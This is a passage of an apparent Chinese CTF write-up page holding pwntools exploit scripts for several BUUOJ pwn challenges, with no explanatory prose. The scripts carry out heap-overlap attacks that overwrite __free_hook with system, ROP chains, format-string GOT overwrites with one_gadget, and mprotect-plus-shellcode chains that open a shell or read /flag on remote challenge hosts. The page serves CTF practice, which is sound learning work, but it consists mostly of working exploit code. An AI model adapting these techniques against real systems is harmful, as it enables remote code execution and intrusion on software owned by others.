class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("roarctf_2019_easy_pwn")</span><br><span class="line">lib = 0</span><br><span class="line">sh = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global lib</span><br><span class="line">global sh</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./roarctf_2019_easy_pwn")</span><br><span class="line">lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">lib = ELF("libc-2.23.so")</span><br><span class="line">def add(size):</span><br><span class="line">sh.sendlineafter(":","1")</span><br><span class="line">sh.sendlineafter(":",str(size))</span><br><span class="line">def free(idx):</span><br><span class="line">sh.sendlineafter(":","3")</span><br><span class="line">sh.sendlineafter(":",str(idx))</span><br><span class="line">def edit(idx,size,content):</span><br><span class="line">sh.sendlineafter(":","2")</span><br><span class="line">sh.sendlineafter(":",str(idx))</span><br><span class="line">sh.sendlineafter(":",str(size))</span><br><span class="line">sh.sendafter(":",content)</span><br><span class="line">def show(idx):</span><br><span class="line">sh.sendlineafter(":","4")#x/50gx 0x202040 + </span><br><span class="line">sh.sendlineafter(":",str(idx))</span><br><span class="line">def Debug():</span><br><span class="line">if(debug == 1):</span><br><span class="line">gdb_script = 'x/50gx &__free_hook - 0x10'</span><br><span class="line">gdb.attach(sh,gdb_script)</span><br><span class="line">add(0x18)</span><br><span class="line">add(0x18)</span><br><span class="line">add(0x88)</span><br><span class="line">add(0x18)</span><br><span class="line">edit(0,(0x18 + 10),'a' * 0x18 + "\x91")</span><br><span class="line">payload = '\x13' * 0x68 + p64(0x21)</span><br><span class="line">payload = payload.ljust(0x88,'\x13')</span><br><span class="line">edit(2,0x88,payload)</span><br><span class="line">free(1)</span><br><span class="line">add(0x88)</span><br><span class="line">payload = p64(0) * 3 + p64(0x91)</span><br><span class="line">payload = payload.ljust(0x88,'\x11')</span><br><span class="line">edit(1,0x88,payload)</span><br><span class="line">free(2)</span><br><span class="line">payload = 'a' * 0x20</span><br><span class="line">edit(1,len(payload),payload)</span><br><span class="line">show(1)</span><br><span class="line">libc = u64(sh.recvuntil('\x7f',False)[-6:].ljust(8,'\x00')) - 88 - lib.symbols['__malloc_hook'] - 0x10</span><br><span class="line">system = libc +lib.symbols['system']</span><br><span class="line">binsh = libc +lib.search("/bin/sh\x00").next()</span><br><span class="line">__free_hook = libc +lib.symbols['__free_hook']</span><br><span class="line">__malloc_hook = libc +lib.symbols['__malloc_hook']</span><br><span class="line">payload = p64(0) * 3 + p64(0x91) + p64(0) + p64(__free_hook - 0x50 + 3)</span><br><span class="line">edit(1,len(payload),payload)</span><br><span class="line">add(0x88)</span><br><span class="line">payload = p64(0) * 3 + p64(0x71)</span><br><span class="line">edit(1,len(payload),payload)</span><br><span class="line">payload = ''</span><br><span class="line">payload = payload.ljust(0x68,'\x00')</span><br><span class="line">payload += p64(0x21)</span><br><span class="line">edit(2,len(payload),payload)</span><br><span class="line">free(2)</span><br><span class="line">payload = p64(0) * 3 + p64(0x71) + p64(__free_hook - 0x40)</span><br><span class="line">edit(1,len(payload),payload)</span><br><span class="line">add(0x68)</span><br><span class="line">add(0x68)</span><br><span class="line">payload = p64(0) * 6 + p64(system)</span><br><span class="line">edit(4,len(payload),payload)</span><br><span class="line">payload = '/bin/sh\x00'</span><br><span class="line">edit(0,len(payload),payload)</span><br><span class="line">free(0)</span><br><span class="line">log.success("libc: " + hex(libc))</span><br><span class="line">log.success("system: " + hex(system))</span><br><span class="line">log.success("binsh: " + hex(binsh))</span><br><span class="line">log.success("__free_hook: " + hex(__free_hook))</span><br><span class="line">log.success("__malloc_hook: " + hex(__malloc_hook))</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("node3.buuoj.cn",28092,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x69-极客大挑战-2019-Not-Bad"><a href="#0x69-极客大挑战-2019-Not-Bad" class="headerlink" title="0x69 [极客大挑战 2019]Not Bad"></a>0x69 [极客大挑战 2019]Not Bad</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("bad")</span><br><span class="line">lib = 0</span><br><span class="line">sh = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">    global sh</span><br><span class="line">    global lib</span><br><span class="line">    if(debug == 1):</span><br><span class="line">        sh = process("./bad")</span><br><span class="line">        lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">    else:</span><br><span class="line">        sh = remote(ip,port)</span><br><span class="line">        lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">    payload = 'a' * 9</span><br><span class="line">    payload += p64(0x400A34)</span><br><span class="line">    payload = payload.ljust(0x20,'a')</span><br><span class="line">    payload += p64(0xc3ca29c429485e55)</span><br><span class="line">    payload += p64(0x4009EE) </span><br><span class="line">    sh.sendlineafter("fun!\n",payload)</span><br><span class="line">    sleep(0.2)</span><br><span class="line">    pop_rdi_ret = elf.search(asm("pop rdi\nret")).next()</span><br><span class="line">    pop_rsi_r15_ret = elf.search(asm("pop rsi\npop r15\nret")).next()</span><br><span class="line">    payload = 'a' * 8</span><br><span class="line">    payload += p64(pop_rdi_ret)</span><br><span class="line">    payload += p64(0)</span><br><span class="line">    payload += p64(pop_rsi_r15_ret)</span><br><span class="line">    payload += p64(elf.bss()) + p64(0)</span><br><span class="line">    payload += p64(elf.plt['read'])</span><br><span class="line">    payload += p64(elf.bss())</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    sleep(0.2)</span><br><span class="line">    shellcode = shellcraft.open("/flag")</span><br><span class="line">    shellcode += shellcraft.read(3,elf.bss() + 0x800,0x30)</span><br><span class="line">    shellcode += shellcraft.write(1,elf.bss() + 0x800,0x30)</span><br><span class="line">    sh.sendline(asm(shellcode))</span><br><span class="line">    sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">    pwn("node3.buuoj.cn",28235,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x70-axb-2019-fmt32"><a href="#0x70-axb-2019-fmt32" class="headerlink" title="0x70 axb_2019_fmt32"></a>0x70 axb_2019_fmt32</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">##coding=utf8</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = 'debug'</span><br><span class="line">ip = "47.108.135.45"</span><br><span class="line">port = 20023</span><br><span class="line">sh = remote(ip, port)</span><br><span class="line">lib = ELF("libc.so.6")</span><br><span class="line">'''</span><br><span class="line">0x3a80c execve("/bin/sh", esp+0x28, environ)</span><br><span class="line">constraints:</span><br><span class="line">  esi is the GOT address of libc</span><br><span class="line">  [esp+0x28] == NULL</span><br><span class="line">0x3a80e execve("/bin/sh", esp+0x2c, environ)</span><br><span class="line">constraints:</span><br><span class="line">  esi is the GOT address of libc</span><br><span class="line">  [esp+0x2c] == NULL</span><br><span class="line">0x3a812 execve("/bin/sh", esp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  esi is the GOT address of libc</span><br><span class="line">  [esp+0x30] == NULL</span><br><span class="line">0x3a819 execve("/bin/sh", esp+0x34, environ)</span><br><span class="line">constraints:</span><br><span class="line">  esi is the GOT address of libc</span><br><span class="line">  [esp+0x34] == NULL</span><br><span class="line">0x5f065 execl("/bin/sh", eax)</span><br><span class="line">constraints:</span><br><span class="line">  esi is the GOT address of libc</span><br><span class="line">  eax == NULL</span><br><span class="line">0x5f066 execl("/bin/sh", [esp])</span><br><span class="line">constraints:</span><br><span class="line">  esi is the GOT address of libc</span><br><span class="line">  [esp] == NULL</span><br><span class="line">'''</span><br><span class="line">sh.sendlineafter('me:',"%9$sA" + p32(0x804A014))</span><br><span class="line">sh.recvuntil('Repeater:')</span><br><span class="line">printf_got = u32(sh.recv(4))</span><br><span class="line">libc = printf_got - 0x049020</span><br><span class="line">system = libc + 0x03a940</span><br><span class="line">free = libc + lib.symbols['free']</span><br><span class="line">__free_hook = libc + lib.symbols['__free_hook']</span><br><span class="line">sh.sendlineafter('me:',"%9$sA" + p32(0x804A014 + 4 * 5))</span><br><span class="line">sh.recvuntil('Repeater:')</span><br><span class="line">__libc_start_main = u32(sh.recv(4))</span><br><span class="line">sh.sendlineafter('me:',"%9$sA" + p32(0x804A030))</span><br><span class="line">sh.recvuntil('Repeater:')</span><br><span class="line">sprintf = u32(sh.recv(4))</span><br><span class="line">one_gadget = [0x3a80c,0x3a80e,0x3a812,0x3a819,0x5f065,0x5f066]</span><br><span class="line">log.success("sprintf: " + hex(sprintf))</span><br><span class="line">log.success("__libc_start_main: " + hex(__libc_start_main))</span><br><span class="line">log.success("printf: " + hex(printf_got))</span><br><span class="line">log.success("system: " + hex(system))</span><br><span class="line">log.success("libc: " + hex(libc))</span><br><span class="line">payload  ='aaaaa'</span><br><span class="line">payload += fmtstr_payload(9,{0x804A014:one_gadget[0] + libc},write_size = "byte",numbwritten = 0xe)</span><br><span class="line">sh.sendlineafter("me:",payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x71-axb-2019-heap"><a href="#0x71-axb-2019-heap" class="headerlink" title="0x71 axb_2019_heap"></a>0x71 axb_2019_heap</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("pwn1")</span><br><span class="line">lib = 0</span><br><span class="line">sh = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global lib</span><br><span class="line">global sh</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./pwn1")</span><br><span class="line">lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">lib = ELF("libc-2.23.so")</span><br><span class="line">pop_rdi_ret = elf.search(asm("pop rdi\nret")).next()</span><br><span class="line">pop_rsi_r15_ret = elf.search(asm("pop rsi\npop r15\nret")).next()</span><br><span class="line">def add(idx,size,content):</span><br><span class="line">sh.sendlineafter(":","1")</span><br><span class="line">sh.sendlineafter(":",str(idx))</span><br><span class="line">sh.sendlineafter(":",str(size))</span><br><span class="line">sh.sendlineafter(":",content)</span><br><span class="line">def edit(idx,content):</span><br><span class="line">sh.sendlineafter(":","4")</span><br><span class="line">sh.sendlineafter(":",str(idx))</span><br><span class="line">sh.sendlineafter(":",content)</span><br><span class="line">def free(idx):</span><br><span class="line">sh.sendlineafter(":","2")</span><br><span class="line">sh.sendlineafter(":",str(idx))</span><br><span class="line">chunk_list = 0x202060</span><br><span class="line">payload = '%14$pAA%2$pB'</span><br><span class="line">sh.sendlineafter(":",payload)</span><br><span class="line">sh.recvuntil("Hello, ")</span><br><span class="line">pie = int(sh.recvuntil("AA",True),16) - (0x55d7eaef1200 - 0x55d7eaef0000)</span><br><span class="line">libc = int(sh.recvuntil("B",True),16) - lib.symbols['__malloc_initialize_hook'] + 0x30</span><br><span class="line">__free_hook = libc + lib.symbols['__free_hook']</span><br><span class="line">system = libc + lib.symbols['system']</span><br><span class="line">add(0,0x88,'\x11' * 0x87)</span><br><span class="line">add(1,0xF8,'\x12' * 0xF7)</span><br><span class="line">add(2,0x18,'\x13' * 0x17)</span><br><span class="line">free(0)</span><br><span class="line">payload = p64(0) + p64(0x81) + p64(pie + chunk_list - 0x18) + p64(pie + chunk_list - 0x10)</span><br><span class="line">payload = payload.ljust(0x80,'\x00')</span><br><span class="line">payload += p64(0x80)</span><br><span class="line">add(0,0x88,payload)</span><br><span class="line">free(1)</span><br><span class="line">payload = p64(0) * 3 + p64(__free_hook - 8) + p64(0x100)</span><br><span class="line">payload += p64(__free_hook - 8) + p64(0x100)</span><br><span class="line">edit(0,payload)</span><br><span class="line">edit(0,'/bin/sh\x00' + p64(system))</span><br><span class="line">free(0)</span><br><span class="line">        log.success("pie: " + hex(pie))</span><br><span class="line">        log.success("libc: " + hex(libc))</span><br><span class="line">        log.success("chunk_list: " + hex(pie + chunk_list))</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("node3.buuoj.cn",28825,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x72-axb-2019-fmt64"><a href="#0x72-axb-2019-fmt64" class="headerlink" title="0x72 axb_2019_fmt64"></a>0x72 axb_2019_fmt64</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = 'debug'</span><br><span class="line">ip = "47.108.135.45"</span><br><span class="line">port = 20023</span><br><span class="line">sh = remote(ip, port)</span><br><span class="line">lib = ELF("libc.so.6")</span><br><span class="line">sprintf_got = 0x601058</span><br><span class="line">payload = '%9$sAAAA' + p64(sprintf_got)</span><br><span class="line">sh.sendlineafter(":",payload)</span><br><span class="line">sprintf = u64(sh.recvuntil("\x7f")[-6:].ljust(8,'\x00'))</span><br><span class="line">libc = sprintf - lib.symbols['sprintf']</span><br><span class="line">system = libc + lib.symbols['system']</span><br><span class="line">one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]</span><br><span class="line">system = libc + one_gadget[0]</span><br><span class="line">payload = ''</span><br><span class="line">payload += '%' + str((system % 0x10000) - 9) + 'c%12$hn'</span><br><span class="line">payload += '%' + str(((system >> 16) % 0x10000) - (system % 0x10000)) + 'c%13$hn'</span><br><span class="line">payload += '%12$s'</span><br><span class="line">payload = payload.ljust(0x20,'\x00')</span><br><span class="line">payload += p64(sprintf_got) + p64(sprintf_got + 2)</span><br><span class="line">sh.sendlineafter(":",payload)</span><br><span class="line">addr = u64(sh.recvuntil("\x7f")[-6:].ljust(8,'\x00'))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x73-bytectf-2019-vip"><a href="#0x73-bytectf-2019-vip" class="headerlink" title="0x73 bytectf_2019_vip"></a>0x73 bytectf_2019_vip</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("vip")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def vip():</span><br><span class="line">    sh.sendlineafter(":","6")</span><br><span class="line">    sh.sendafter(':',flat('a'*0x20, </span><br><span class="line">    0x0000000000000020, 0x0000010101000015, </span><br><span class="line">    0x0005000000000006, 0x7fff000000000006,))</span><br><span class="line">def add(idx):</span><br><span class="line">    sh.recvuntil("Your choice:")</span><br><span class="line">    sh.sendline("1")</span><br><span class="line">    sh.sendlineafter(":",str(idx))</span><br><span class="line">def free(idx):</span><br><span class="line">    sh.sendlineafter("Your choice:","3")</span><br><span class="line">    sh.sendlineafter(":",str(idx))</span><br><span class="line">def show(idx):</span><br><span class="line">    sh.sendlineafter("Your choice:","2")</span><br><span class="line">    sh.sendlineafter(":",str(idx))</span><br><span class="line">def edit(idx,size,content):</span><br><span class="line">    sh.recvuntil("Your choice:")</span><br><span class="line">    sh.sendline("4")</span><br><span class="line">    sh.recvuntil(":")</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.sendlineafter(":",str(size))</span><br><span class="line">    sh.recvuntil("Content:")</span><br><span class="line">    sh.send(content)</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">    global sh</span><br><span class="line">    global lib</span><br><span class="line">    if(debug == 1):</span><br><span class="line">        sh = process("./vip")</span><br><span class="line">        lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">    else:</span><br><span class="line">        sh = remote(ip,port)</span><br><span class="line">        lib = ELF("libc-2.27.so")</span><br><span class="line">    chunk_list = 0x404100</span><br><span class="line">    vip()</span><br><span class="line">    add(0)</span><br><span class="line">    add(1)</span><br><span class="line">    add(5)</span><br><span class="line">    add(6)</span><br><span class="line">    add(10)</span><br><span class="line">    free(6)</span><br><span class="line">    free(1)</span><br><span class="line">    payload = 'a' * 0x50 + p64(0) + p64(0x61) + p64(elf.got['free'])</span><br><span class="line">    edit(0,0x70,payload)</span><br><span class="line">    add(1)</span><br><span class="line">    add(2)</span><br><span class="line">    show(2)</span><br><span class="line">    free_addr = u64(sh.recvuntil("\x7f",False)[-6:].ljust(8,'\x00'))</span><br><span class="line">    libc = free_addr - lib.symbols['free']</span><br><span class="line">    system = libc + lib.symbols['system']</span><br><span class="line">    execve = libc + lib.symbols['execve']</span><br><span class="line">    printf = libc + lib.symbols['printf']</span><br><span class="line">    mprotect = libc + lib.symbols['mprotect']</span><br><span class="line">    edit(2,9,p64(printf))</span><br><span class="line">    edit(10,8,"%8$p\x00")</span><br><span class="line">    free(10)</span><br><span class="line">    sh.recvuntil("0x")</span><br><span class="line">    stack = int(sh.recvuntil("Done!",True),16) - 8 * 13</span><br><span class="line">    payload  = p64(libc + lib.symbols['free'])</span><br><span class="line">    payload += p64(libc + lib.symbols['puts'])</span><br><span class="line">    payload += p64(libc + lib.symbols['__stack_chk_fail'])</span><br><span class="line">    payload += p64(libc + lib.symbols['printf'])</span><br><span class="line">    payload += p64(libc + lib.symbols['memset'])</span><br><span class="line">    payload += p64(libc + lib.symbols['read'])</span><br><span class="line">    payload += p64(libc + lib.symbols['prctl'])</span><br><span class="line">    payload += p64(libc + lib.symbols['malloc'])</span><br><span class="line">    payload += p64(libc + lib.symbols['setvbuf'])</span><br><span class="line">    payload += p64(libc + lib.symbols['open'])</span><br><span class="line">    payload += p64(libc + lib.symbols['perror'])</span><br><span class="line">    payload += p64(libc + lib.symbols['atoi'])</span><br><span class="line">    payload += p64(libc + lib.symbols['scanf'])</span><br><span class="line">    payload += p64(libc + lib.symbols['exit'])</span><br><span class="line">    payload = payload.ljust(0x4040a0 - 0x404018,'\x00')</span><br><span class="line">    payload += p64(libc + lib.symbols['_IO_2_1_stdout_']) + p64(0)</span><br><span class="line">    payload += p64(libc + lib.symbols['_IO_2_1_stdin_']) + p64(0)</span><br><span class="line">    payload += p64(libc + lib.symbols['_IO_2_1_stderr_'])</span><br><span class="line">    payload += p64(0) * 7</span><br><span class="line">    payload += p64(stack)</span><br><span class="line">    edit(2,0x500,payload)</span><br><span class="line">    pop_rdx_ret = 0x1b96 + libc</span><br><span class="line">    pop_rdi_ret = 0x4018fb</span><br><span class="line">    pop_rsi_r15_ret = 0x4018f9</span><br><span class="line">    base = 0x404000</span><br><span class="line">    payload = p64(pop_rdi_ret) + p64(base)</span><br><span class="line">    payload += p64(pop_rsi_r15_ret) + p64(0x1000) + p64(0)</span><br><span class="line">    payload += p64(pop_rdx_ret) + p64(7)</span><br><span class="line">    payload += p64(mprotect)</span><br><span class="line">    payload += p64(pop_rdi_ret) + p64(0)</span><br><span class="line">    payload += p64(pop_rsi_r15_ret) + p64(base + 0x800) + p64(0)</span><br><span class="line">    payload += p64(pop_rdx_ret) + p64(0x500)</span><br><span class="line">    payload += p64(libc + lib.symbols['read'])</span><br><span class="line">    payload += p64(base + 0x800)</span><br><span class="line">    edit(0,0x500,payload)</span><br><span class="line">    sleep(0.2)</span><br><span class="line">    payload = 'H\xb8\x01\x01\x01\x01\x01\x01\x01\x01PH\xb8.gm`f\x01\x01\x01H1\x04$H\x89\xe71\xd21\xf6j\x02X\x0f\x051\xc0j\x03_j@Z\xbe\x01\x01\x01\x01\x81\xf6\xa1AA\x01\x0f\x05j\x01_j@Z\xbe\x01\x01\x01\x01\x81\xf6\xa1AA\x01j\x01X\x0f\x05'</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    log.success("libc: " + hex(libc))</span><br><span class="line">    log.success("stack: " + hex(stack))</span><br><span class="line">    log.success("system: " + hex(system))</span><br><span class="line">    if(debug == 1):</span><br><span class="line">        log.success("pid: " + str(sh.pid))</span><br><span class="line">    sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">    pwn("node3.buuoj.cn",25165,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x74-SWPUCTF-2019-login"><a href="#0x74-SWPUCTF-2019-login" class="headerlink" title="0x74 SWPUCTF_2019_login"></a>0x74 SWPUCTF_2019_login</h2><div 